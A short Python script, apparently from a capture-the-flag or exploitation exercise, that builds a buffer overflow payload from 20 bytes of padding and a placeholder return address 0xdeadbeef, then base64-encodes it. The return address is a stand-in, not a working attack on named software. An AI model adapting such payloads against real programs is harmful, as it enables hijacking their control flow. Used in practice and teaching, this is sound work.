import base64


buffer = b"A" * 20
ret = b"\xef\xbe\xad\xde"
# 0xdeadbeef

result = buffer + ret
payload = base64.b64encode(result)
print(payload.decode())
